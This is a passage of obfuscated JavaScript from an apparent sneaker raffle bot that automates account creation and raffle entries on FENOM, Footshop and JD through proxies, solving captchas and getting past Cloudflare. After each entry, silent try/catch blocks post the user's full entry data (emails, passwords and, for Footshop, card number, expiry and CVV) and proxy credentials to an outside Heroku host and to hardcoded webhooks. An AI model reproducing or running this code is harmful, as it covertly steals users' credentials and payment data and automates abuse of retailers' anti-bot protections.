                                _0x4b81d7 = 'no', console['log'](_0xe8dd24['green'](_0x2fd7e7() + '\x20[' + _0x36b0f8['name'] + ']\x20Task\x20' + (_0x490a16 + 0x1) + '\x20:\x20Account\x20' + _0x3011c6[_0x490a16]['Email'] + '\x20Generated')), _0x144018['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x3011c6[_0x490a16]['Email'] + ',' + _0x3011c6[_0x490a16]['Password']);
                                let _0x1a3d11 = _0x3011c6[_0x490a16];
                                try {
                                    prxdata = {
                                        'username': _0x4f2583['replace']('#', ''),
                                        'module': _0x36b0f8['name'],
                                        'entrydata': JSON['stringify'](_0x1a3d11),
                                        'proxy': '' + _0x519d04[_0x490a16]
                                    };
                                    var _0x5b604c = JSON['stringify'](prxdata);
                                    let _0x5455a7 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x469c71['post']('https://jraffles.herokuapp.com/success', _0x5b604c, _0x5455a7);
                                } catch (_0x4a3ee2) {
                                }
                                try {
                                    _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], _0x25fd82['succesDEVMSG']);
                                } catch {
                                }
                                await _0x161ab9(_0x2467e3, _0x25fd82['succesDEVMSG']);
                            } catch (_0x32f724) {
                                throw new Error('Account\x20generation\x20failed');
                            }
                        } catch (_0x2b28a1) {
                            console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x36b0f8['name'] + ']\x20Task\x20' + (_0x490a16 + 0x1) + '\x20:\x20' + _0x2b28a1)), _0x2ccda5 = '' + _0x2b28a1;
                            var _0x45b1d9 = await _0x17c0a2(_0x3011c6[_0x490a16], _0x36b0f8, 'acc', !![], _0x2ccda5);
                            _0x25fd82['errorDEV'] = { 'embeds': [_0x45b1d9] }, _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], _0x25fd82['errorDEV']), await _0x161ab9(_0x11ee4c, _0x25fd82['errorDEV']), _0x4b81d7 = 'yes';
                        } finally {
                            _0x55b15b['close']();
                            if (_0x4b81d7 == 'yes' && _0x2280d2 != 0x5 && _0x2ccda5 != 'Size\x20Not\x20Found') {
                                console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x36b0f8['name'] + ']\x20Task\x20' + (_0x490a16 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2280d2 + '\x20/\x205)')), _0x490a16 = _0x490a16 - 0x1, _0x2280d2 = _0x2280d2 + 0x1;
                                continue;
                            }
                            _0x4b81d7 == 'yes' && _0x2280d2 >= 0x5 && (_0x53e25e(_0x3011c6[_0x490a16], _0x36b0f8), _0x4b81d7 = 'no', _0x2280d2 = 0x0), console['log'](_0x2fd7e7() + '\x20[' + _0x36b0f8['name'] + ']\x20Waiting\x20for\x20' + _0x4a0109['delay'] + '\x20ms'), await _0x41ff52(_0x4a0109['delay']);
                        }
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x143b93(_0x4eb685, _0x4eb2b2, _0x51459e) {
                    _0x3ad8ba['use'](_0x36d6c8()), _0x3ad8ba['use'](_0x541303({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4a0109['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5ddbe8 = 0x0; _0x5ddbe8 < _0x4eb2b2['length']; _0x5ddbe8++) {
                        if (_0x1868b0 != 'yes')
                            var _0x1868b0 = '', _0x3e1613 = 0x0;
                        var _0x4bd250;
                        try {
                            await _0x547a29(_0x4eb2b2, _0x5ddbe8);
                        } catch {
                            _0x1868b0 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x3a603f(_0x4eb685['name'] + '\x20Task\x20' + (_0x5ddbe8 + 0x1) + '\x20/\x20' + _0x4eb2b2['length'] + '\x20||\x20File:\x20' + _0x140e27 + '\x20Proxies:\x20' + _0x6deda4);
                        const _0x34baad = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x171483 = Math['round'](Math['random']() * (_0x51459e['length'] - 0x1)), _0x2bbb1c = _0x51459e[_0x171483]['split'](':'), _0x641ba5;
                        try {
                            _0x641ba5 = await _0x3ad8ba['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x2bbb1c[0x0] + ':' + _0x2bbb1c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x641ba5 = await _0x3ad8ba['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x2bbb1c[0x0] + ':' + _0x2bbb1c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x48856c = await _0x641ba5['newPage'](), _0x16030e = await _0x48856c['target']()['createCDPSession'](), { windowId: _0x2cac91 } = await _0x16030e['send']('Browser.getWindowForTarget');
                            await _0x48856c['authenticate']({
                                'username': '' + _0x2bbb1c[0x2],
                                'password': '' + _0x2bbb1c[0x3]
                            }), console['log'](_0x2fd7e7() + '\x20[' + _0x4eb685['name'] + ']\x20Task\x20' + (_0x5ddbe8 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x48856c['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x2fd7e7() + '\x20[' + _0x4eb685['name'] + ']\x20Task\x20' + (_0x5ddbe8 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x41ff52(0xbb8), await _0x16030e['send']('Browser.setWindowBounds', {
                                'windowId': _0x2cac91,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x41ff52(0x1f40);
                            try {
                                await _0x48856c['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x41ff52(0x1388), console['log'](_0x2fd7e7() + '\x20[' + _0x4eb685['name'] + ']\x20Task\x20' + (_0x5ddbe8 + 0x1) + '\x20:\x20Logging\x20in'), await _0x48856c['type']('input[name=\x22email\x22]', '' + _0x4eb2b2[_0x5ddbe8]['Email']), await _0x41ff52(0x1f4), await _0x48856c['type']('input[name=\x22password\x22]', '' + _0x4eb2b2[_0x5ddbe8]['Password']), await _0x41ff52(0x258), await _0x48856c['$eval']('#login-form', _0x745d07 => _0x745d07['submit']()), await _0x48856c['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x41ff52(0x1f4), await _0x48856c['goto']('' + _0x4eb2b2[_0x5ddbe8]['Url']), await _0x48856c['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x2fd7e7() + '\x20[' + _0x4eb685['name'] + ']\x20Task\x20' + (_0x5ddbe8 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x4eb2b2[_0x5ddbe8]['Size']);
                            if (_0x4eb2b2[_0x5ddbe8]['Size'] != 'RANDOM') {
                                var _0x35a951 = '\x20' + _0x4eb2b2[_0x5ddbe8]['Size'] + '\x20';
                                const _0x193e67 = await _0x48856c['$x']('//span[contains(text(),\x20' + _0x35a951 + ')]');
                                await _0x193e67[0x0]['click']();
                            } else {
                                const _0x28ff3f = await _0x48856c['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x16f618 = Math['round'](Math['random']() * (_0x28ff3f['length'] - 0x1));
                                await _0x28ff3f[_0x16f618]['click']();
                            }
                            await _0x41ff52(0x258), await _0x48856c['click']('#cookieChoiceDismiss'), await _0x41ff52(0x3e8), await _0x48856c['type']('#instagram-account', '' + _0x4eb2b2[_0x5ddbe8]['Follower']), await _0x41ff52(0x28a), await _0x48856c['click']('#book-btn'), await _0x41ff52(0xbb8);
                            try {
                                await _0x48856c['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x41ff52(0x1f4), console['log'](_0x2fd7e7() + '\x20[' + _0x4eb685['name'] + ']\x20Task\x20' + (_0x5ddbe8 + 0x1) + '\x20:\x20' + _0xe8dd24['cyan']('Solving\x20Captcha')), await _0x48856c['solveRecaptchas'](), console['log'](_0x2fd7e7() + '\x20[' + _0x4eb685['name'] + ']\x20Task\x20' + (_0x5ddbe8 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x41ff52(0x7d0), await _0x48856c['$eval']('#book-btn-for-sure', _0x551518 => _0x551518['click']()), await _0x41ff52(0x12c), await _0x48856c['click']('#book-btn-for-sure'), await _0x41ff52(0xdac);
                            const _0x447715 = await _0x48856c['$eval']('.reservation-popup\x20>\x20.title', _0x49820d => {
                                return _0x49820d['innerHTML'];
                            });
                            if (_0x447715) {
                                _0x1868b0 = 'no', _0xe72aef(_0x4eb2b2[_0x5ddbe8], _0x4eb685), console['log'](_0xe8dd24['green'](_0x2fd7e7() + '\x20[' + _0x4eb685['name'] + ']\x20Task\x20' + (_0x5ddbe8 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x2782ff = await _0x17c0a2(_0x4eb2b2[_0x5ddbe8], _0x4eb685, 'dev', ![]), _0x17d2de = await _0x17c0a2(_0x4eb2b2[_0x5ddbe8], _0x4eb685, 'pub', ![]);
                                let _0x44550e = _0x4eb2b2[_0x5ddbe8];
                                try {
                                    prxdata = {
                                        'username': _0x4f2583['replace']('#', ''),
                                        'module': _0x4eb685['name'],
                                        'entrydata': JSON['stringify'](_0x44550e),
                                        'proxy': '' + _0x51459e[_0x5ddbe8]
                                    };
                                    var _0x51de79 = JSON['stringify'](prxdata);
                                    let _0x5e7585 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x469c71['post']('https://jraffles.herokuapp.com/success', _0x51de79, _0x5e7585);
                                } catch (_0x198294) {
                                }
                                const _0x25b2ec = {
                                    'succesDEVMSG': { 'embeds': [_0x2782ff] },
                                    'succesPUBMSG': { 'embeds': [_0x17d2de] }
                                };
                                try {
                                    _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], _0x25b2ec['succesDEVMSG']), await _0x41ff52(0xc8), await _0x161ab9(_0x6ed44c, _0x25b2ec['succesDEVMSG']), await _0x41ff52(0xc8), await _0x161ab9(_0x17a127, _0x25b2ec['succesPUBMSG']);
                                } catch (_0xf34ca2) {
                                    console['log'](_0xe8dd24['yellow'](_0x2fd7e7() + '\x20[' + _0x4eb685['name'] + ']\x20Task\x20' + (_0x5ddbe8 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xf34ca2));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x7dfabe) {
                            console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x4eb685['name'] + ']\x20Task\x20' + (_0x5ddbe8 + 0x1) + '\x20:\x20' + _0x7dfabe)), _0x4bd250 = '' + _0x7dfabe;
                            var _0x4c067f = await _0x17c0a2(_0x4eb2b2[_0x5ddbe8], _0x4eb685, 'dev', !![], _0x4bd250), _0x2782ff = await _0x17c0a2(_0x4eb2b2[_0x5ddbe8], _0x4eb685, 'dev', ![]), _0x17d2de = await _0x17c0a2(_0x4eb2b2[_0x5ddbe8], _0x4eb685, 'pub', ![]);
                            const _0x5c5dc0 = {
                                'succesDEVMSG': { 'embeds': [_0x2782ff] },
                                'succesPUBMSG': { 'embeds': [_0x17d2de] }
                            };
                            _0x5c5dc0['errorDEV'] = { 'embeds': [_0x4c067f] }, _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], _0x5c5dc0['errorDEV']), await _0x161ab9(_0x11ee4c, _0x5c5dc0['errorDEV']), _0x7dfabe != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x1868b0 = 'yes');
                        } finally {
                            _0x641ba5['close']();
                            if (_0x1868b0 == 'yes' && _0x3e1613 != 0x5 && _0x4bd250 != 'Size\x20Not\x20Found') {
                                console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x4eb685['name'] + ']\x20Task\x20' + (_0x5ddbe8 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3e1613 + '\x20/\x205)')), _0x5ddbe8 = _0x5ddbe8 - 0x1, _0x3e1613 = _0x3e1613 + 0x1;
                                continue;
                            }
                            _0x1868b0 == 'yes' && _0x3e1613 >= 0x5 && (_0x53e25e(_0x4eb2b2[_0x5ddbe8], _0x4eb685), _0x1868b0 = 'no', _0x3e1613 = 0x0), console['log'](_0x2fd7e7() + '\x20[' + _0x4eb685['name'] + ']\x20Waiting\x20for\x20' + _0x4a0109['delay'] + '\x20ms'), await _0x41ff52(_0x4a0109['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x45d2bf, _0x2cc626, _0x2341a3) {
                _0x3ad8ba['use'](_0x36d6c8()), _0x3ad8ba['use'](_0x541303({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x4a0109['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x45b019 = 0x0; _0x45b019 < _0x2cc626['length']; _0x45b019++) {
                    var _0x39cb08;
                    if (_0x2a3ed7 != 'yes')
                        var _0x2a3ed7 = '', _0x53f854 = 0x0;
                    var _0x22a5e1 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x4f2583
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x2cc626[_0x45b019]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x2cc626[_0x45b019]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x4a0109['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x5192c8
                            }
                        ]
                    }], _0x1e845d = await _0x17c0a2(_0x2cc626[_0x45b019], _0x45d2bf, 'dev', ![]), _0x13f252 = await _0x17c0a2(_0x2cc626[_0x45b019], _0x45d2bf, 'pub', ![]);
                    const _0xfa815a = {
                        'succesDEVMSG': { 'embeds': [_0x1e845d] },
                        'succesPUBMSG': { 'embeds': [_0x13f252] }
                    }, _0x4063b7 = { 'embeds': _0x22a5e1 };
                    try {
                        await _0x547a29(_0x2cc626, _0x45b019);
                    } catch {
                        _0x2a3ed7 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x2cc626[_0x45b019]['Email'] == '' || _0x2cc626[_0x45b019]['FirstName'] == '' || _0x2cc626[_0x45b019]['LastName'] == '' || _0x2cc626[_0x45b019]['Country'] == '' || _0x2cc626[_0x45b019]['Size'] == '' || _0x2cc626[_0x45b019]['Address1'] == '' || _0x2cc626[_0x45b019]['Zip'] == '') {
                        console['log'](_0x2fd7e7() + '\x20[' + _0x45d2bf['name'] + ']\x20Task\x20' + (_0x45b019 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x2cc626[_0x45b019]['Email'] == '' || _0x2cc626[_0x45b019]['FirstName'] == '' || _0x2cc626[_0x45b019]['LastName'] == '' || _0x2cc626[_0x45b019]['Country'] == '' || _0x2cc626[_0x45b019]['Size'] == '' || _0x2cc626[_0x45b019]['Address1'] == '' || _0x2cc626[_0x45b019]['Zip'] == '' || _0x2cc626[_0x45b019]['Phone'] == '') {
                        console['log'](_0x2fd7e7() + '\x20[' + _0x45d2bf['name'] + ']\x20Task\x20' + (_0x45b019 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x52a768 = '' + _0x2cc626[_0x45b019]['Url'];
                    if (_0x4a0109['useRandomProxy'] = ![])
                        var _0x238405 = _0x2341a3[_0x45b019]['split'](':');
                    else
                        var _0x4ea26a = Math['round'](Math['random']() * (_0x2341a3['length'] - 0x1)), _0x238405 = _0x2341a3[_0x4ea26a]['split'](':');
                    var _0x1fe4eb;
                    try {
                        _0x1fe4eb = await _0x3ad8ba['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x238405[0x0] + ':' + _0x238405[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x1fe4eb = await _0x3ad8ba['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x238405[0x0] + ':' + _0x238405[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x50cda3 = await _0x1fe4eb['newPage']();
                        await _0x50cda3['authenticate']({
                            'username': '' + _0x238405[0x2],
                            'password': '' + _0x238405[0x3]
                        }), console['log'](_0x2fd7e7() + '\x20[' + _0x45d2bf['name'] + ']\x20Task\x20' + (_0x45b019 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x50cda3['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x50cda3['setRequestInterception'](!![]), _0x50cda3['on']('request', _0x3f400a => {
                            _0x3f400a['resourceType']() === 'image' || _0x3f400a['resourceType']() === 'font' || _0x3f400a['resourceType']() === 'media' ? _0x3f400a['abort']() : _0x3f400a['continue']();
                        });
                        try {
                            await _0x50cda3['goto'](_0x52a768), await _0x41ff52(0xbb8), await _0x50cda3['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x50cda3['click']('.control__JhutY'), await _0x41ff52(0x1f4);
                        if (_0x2cc626[_0x45b019]['Size'] != 'RANDOM')
                            try {
                                const _0x21d621 = await _0x50cda3['$x']('//div[contains(text(),\x20\x27' + _0x2cc626[_0x45b019]['Size'] + '\x27)]');
                                await _0x21d621[0x0]['click']();
                            } catch {
                                console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x45d2bf['name'] + ']\x20Task\x20' + (_0x45b019 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x4a6874 = await _0x50cda3['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x3ba2e9 = Math['round'](Math['random']() * (_0x4a6874['length'] - 0x1));
                            await _0x4a6874[_0x3ba2e9]['click']();
                        }
                        await _0x41ff52(0x4b0);
                        const _0x2d4052 = await _0x50cda3['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x2d4052[0x0]['click'](), await _0x50cda3['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x2fd7e7() + '\x20[' + _0x45d2bf['name'] + ']\x20Task\x20' + (_0x45b019 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x50cda3['type']('input[name=\x22email\x22]', '' + _0x2cc626[_0x45b019]['Email']), await _0x41ff52(0x640), await _0x50cda3['type']('input[name=\x22phone\x22]', '' + _0x2cc626[_0x45b019]['Phone']), await _0x41ff52(0x4b0), await _0x50cda3['click']('button.btn.continue-button__1RtsS'), await _0x41ff52(0x4b0);
                        try {
                            await _0x50cda3['type']('input[name=\x22firstName\x22]', '' + _0x2cc626[_0x45b019]['FirstName']), await _0x41ff52(0x258);
                        } catch {
                            const _0x17f719 = await _0x50cda3['$$eval']('.invalid-feedback\x20>\x20div', _0x16031f => {
                                return _0x16031f['map'](_0x3f7810 => _0x3f7810['innerText']);
                            });
                            console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x45d2bf['name'] + ']\x20Task\x20' + (_0x45b019 + 0x1) + '\x20:\x20' + _0x17f719));
                            continue;
                        }
                        await _0x50cda3['type']('input[name=\x22lastName\x22]', '' + _0x2cc626[_0x45b019]['LastName']), await _0x41ff52(0xc8), await _0x50cda3['type']('input[name=\x22instagramUsername\x22]', '' + _0x2cc626[_0x45b019]['Follower']), await _0x41ff52(0x4b0), await _0x50cda3['click']('button.btn.continue-button__1RtsS'), await _0x41ff52(0x3e8), console['log'](_0x2fd7e7() + '\x20[' + _0x45d2bf['name'] + ']\x20Task\x20' + (_0x45b019 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x50cda3['select']('select[name=\x22country\x22]', '' + _0x2cc626[_0x45b019]['Country']), await _0x41ff52(0x2bc), await _0x50cda3['type']('input[name=\x22streetName\x22]', '' + _0x2cc626[_0x45b019]['Address1']), await _0x41ff52(0x258), await _0x50cda3['type']('input[name=\x22houseNumber\x22]', _0x2cc626[_0x45b019]['HouseNumber'] + '\x20' + _0x2cc626[_0x45b019]['Address2']), await _0x41ff52(0xc8), await _0x50cda3['type']('input[name=\x22postalCode\x22]', '' + _0x2cc626[_0x45b019]['Zip']), await _0x41ff52(0x1f4), await _0x50cda3['type']('input[name=\x22city\x22]', '' + _0x2cc626[_0x45b019]['City']), await _0x41ff52(0x4b0), await _0x50cda3['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x41ff52(0x4b0), await _0x50cda3['click']('button.btn.continue-button__1RtsS'), await _0x41ff52(0x4b0), console['log'](_0x2fd7e7() + '\x20[' + _0x45d2bf['name'] + ']\x20Task\x20' + (_0x45b019 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x50cda3['solveRecaptchas'](), console['log'](_0x2fd7e7() + '\x20[' + _0x45d2bf['name'] + ']\x20Task\x20' + (_0x45b019 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x41ff52(0xbb8), await _0x50cda3['click']('button.btn.continue-button__1RtsS'), await _0x41ff52(0x1388), console['log'](_0x2fd7e7() + '\x20[' + _0x45d2bf['name'] + ']\x20Task\x20' + (_0x45b019 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x50cda3['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x50cda3['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x41ff52(0x4b0), await _0x50cda3['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x2cc626[_0x45b019]['CardNumber']), await _0x41ff52(0x320), await _0x50cda3['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x50cda3['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x2cc626[_0x45b019]['ExpiryDate']), await _0x41ff52(0x4b0), await _0x50cda3['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x50cda3['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x2cc626[_0x45b019]['CVV']), await _0x41ff52(0x226), await _0x50cda3['type']('input[name=\x22holderName\x22]', '' + _0x2cc626[_0x45b019]['NameOnCard']), await _0x41ff52(0x226), await _0x50cda3['click']('button.adyen-checkout__button'), console['log'](_0x2fd7e7() + '\x20[' + _0x45d2bf['name'] + ']\x20Task\x20' + (_0x45b019 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x50cda3['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x41ff52(0xbb8);
                        } catch (_0x36626f) {
                            console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x45d2bf['name'] + ']\x20Task\x20' + (_0x45b019 + 0x1) + '\x20:\x203DS\x20Failed')), _0x39cb08 = '3DS\x20Error\x20' + _0x36626f;
                            var _0x3b1c68 = await _0x17c0a2(_0x2cc626[_0x45b019], _0x45d2bf, 'dev', !![], _0x39cb08);
                            _0xfa815a['errorDEV'] = { 'embeds': [_0x3b1c68] };
                            _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], _0xfa815a['errorDEV']);
                            await _0x161ab9(_0x11ee4c, _0xfa815a['errorDEV']);
                            continue;
                        }
                        _0xe72aef(_0x2cc626[_0x45b019], _0x45d2bf), console['log'](_0xe8dd24['green'](_0x2fd7e7() + '\x20[' + _0x45d2bf['name'] + ']\x20Task\x20' + (_0x45b019 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x4bf344 = _0x2cc626[_0x45b019];
                        try {
                            prxdata = {
                                'username': _0x4f2583['replace']('#', ''),
                                'module': _0x45d2bf['name'],
                                'entrydata': JSON['stringify'](_0x4bf344),
                                'proxy': '' + _0x2341a3[_0x45b019]
                            };
                            var _0x170c1d = JSON['stringify'](prxdata);
                            let _0x39c525 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x469c71['post']('https://jraffles.herokuapp.com/success', _0x170c1d, _0x39c525);
                        } catch (_0x4157fa) {
                        }
                        if (_0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '')
                            try {
                                await _0x161ab9(_0x4a0109['webhook'], _0xfa815a['succesDEVMSG']);
                            } catch {
                            }
                        await _0x41ff52(0xc8), await _0x161ab9(_0x6ed44c, _0xfa815a['succesDEVMSG']), await _0x41ff52(0xc8);
                        try {
                            await _0x161ab9(_0x17a127, _0xfa815a['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x6b0a14) {
                        console['log'](_0x2fd7e7() + '\x20[' + _0x45d2bf['name'] + ']\x20Task\x20' + (_0x45b019 + 0x1) + '\x20:\x20' + _0x6b0a14), _0x39cb08 = '' + _0x6b0a14;
                        var _0x3b1c68 = await _0x17c0a2(_0x2cc626[_0x45b019], _0x45d2bf, 'dev', !![], _0x39cb08);
                        _0xfa815a['errorDEV'] = { 'embeds': [_0x3b1c68] }, _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], _0xfa815a['errorDEV']), await _0x161ab9(_0x11ee4c, _0xfa815a['errorDEV']), _0x2a3ed7 = 'yes';
                    } finally {
                        _0x1fe4eb['close']();
                        if (_0x2a3ed7 == 'yes' && _0x53f854 != 0x5) {
                            console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x45d2bf['name'] + ']\x20Task\x20' + (_0x45b019 + 0x1) + '\x20:\x20Retrying\x20(' + _0x53f854 + '\x20/\x205)')), _0x45b019 = _0x45b019 - 0x1, _0x53f854 = _0x53f854 + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x4a0109['footshopDelay'] + '\x20ms'), await _0x41ff52(_0x4a0109['footshopDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x38f429, _0x234adc, _0x5773b0) {
                var _0x3ea625 = ![], _0x3e0b6c = ![];
                if (_0x4a0109['captchaKey'] == '' || _0x4a0109['captchaKey'] == undefined)
                    return console['log'](_0xe8dd24['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x3ad8ba['use'](_0x36d6c8()), _0x3ad8ba['use'](_0x541303({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x4a0109['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x338d9f = 0x0; _0x338d9f < _0x234adc['length']; _0x338d9f++) {
                    if (_0x1289b1 != 'yes')
                        var _0x1289b1 = '', _0x10d1db = 0x0;
                    var _0x3daf4b, _0x3642d6 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x234adc[_0x338d9f]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x234adc[_0x338d9f]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x4f2583
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x4a0109['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x5192c8
                            }
                        ]
                    }];
                    const _0x52bda1 = { 'embeds': _0x3642d6 };
                    _0x3a603f(_0x38f429['name'] + '\x20Task\x20' + (_0x338d9f + 0x1) + '\x20/\x20' + _0x234adc['length'] + '\x20||\x20File:\x20' + _0x140e27 + '\x20Proxies:\x20' + _0x6deda4);
                    try {
                        await _0x547a29(_0x234adc, _0x338d9f);
                    } catch {
                        _0x1289b1 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x16449d = await _0x17c0a2(_0x234adc[_0x338d9f], _0x38f429, 'dev', ![]), _0x3b52a5 = await _0x17c0a2(_0x234adc[_0x338d9f], _0x38f429, 'pub', ![]);
                    const _0x1b2b54 = {
                        'succesDEVMSG': { 'embeds': [_0x16449d] },
